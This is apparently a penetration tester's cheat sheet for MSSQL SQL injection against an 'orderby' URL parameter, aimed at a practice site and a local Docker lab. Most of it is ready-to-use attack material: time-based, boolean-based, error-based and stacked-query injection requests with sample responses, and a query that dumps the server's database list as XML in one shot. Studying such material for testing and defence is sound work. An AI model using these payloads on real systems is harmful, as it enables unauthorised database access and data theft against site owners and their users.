# mssql_danger_functionalities_and_misconfigurations

## Techniques
### Time Based
Req
```http
GET /Make/2?orderby=supercarid+WAITFOR+DELAY+'00:00:04'-- HTTP/2
Host: hack-yourself-first.com
```

### Boolean Based
Req
```http
GET /Make/2?orderby=(select+CASE+WHEN+(1=2)+THEN+'supercarid'+ELSE+(SELECT+1+Union+select+2)+END)-- HTTP/2
Host: hack-yourself-first.com
```
Response when false
```
Status code 500
Subquery returned more than 1 value
```

### Error Based
Req
```
GET /Make/2?orderby=(CONVERT(INT%2c@@version))-- HTTP/2
Host: hack-yourself-first.com
```
Response
```
Conversion failed when converting the nvarchar value 'Microsoft SQL Azure (RTM) - 12.0.2000.8 <br>	Nov &nbsp;2 2023 01:40:17 <br>	Copyright (C) 2022 Microsoft Corporation<br>' to data type int.</title>
```

### Stacked queried
Req
```
GET /Make/2?orderby=supercarid;WAITFOR+DELAY+'00:00:04'-- HTTP/2
Host: hack-yourself-first.com
```

## Useful Queries

**CAUTION**
The following query should be executed with caution as it has the potential to impact the performance of MSSQL, depending on the size of the table entries returned. It is recommended to run it only when there is confidence that the returned row isn't excessively long.

### DUMP all in one shot using XML
Request
```
(select * from master..sysdatabases) for xml PATH('')
```
Response
```
<name>master</name><dbid>1</dbid><sid>AQ==</sid><mode>0</mode><status>65544</status><status2>
```
**Note**: The querie will not work if PATH("") was writed with double quotes. 

## Inspired by
* https://blog.improsec.com/tech-blog/dangers-mssql-features-impersonation-amp-links
* https://www.madeiradata.com/post/how-to-protect-sql-server-from-hackers-and-penetration-tests

## Resources
* https://github.com/ktaranov/sqlserver-kit
* https://github.com/quentinhardy/msdat

## Local Lab
Docker instance
```
docker run -e "ACCEPT_EULA=Y" -e 'MSSQL_SA_PASSWORD=yourStrong(!)Password' -p 1433:1433 -d mcr.microsoft.com/mssql/server:2019-latest
```
